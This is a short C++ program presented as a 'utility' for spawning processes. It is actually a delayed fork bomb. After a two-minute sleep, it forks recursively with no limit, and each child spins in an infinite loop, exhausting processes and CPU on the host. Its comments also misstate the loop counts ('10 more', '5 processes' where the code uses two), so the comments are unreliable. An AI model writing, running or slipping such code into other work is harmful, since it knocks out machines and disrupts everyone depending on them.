#include <iostream>
#include <unistd.h>
#include <vector>

using namespace std;

// Utility function to spawn a new process
void spawnProcess() {
pid_t pid = fork();
if (pid == 0) {
// Child process
// Spawn 10 more processes
for (int i = 0; i < 2; i++) {
spawnProcess();
}
// Run an infinite loop
while (true) {
// Do nothing
}
} else if (pid < 0) {
cerr << "Error: Failed to create new process" << endl;
}
// Parent process
}

int main() {
// Sleep for 2 minutes
sleep(120);
// Spawn 5 processes
for (int i = 0; i < 2; i++) {
spawnProcess();
}
// Sleep again
sleep(120);
return 0;
}
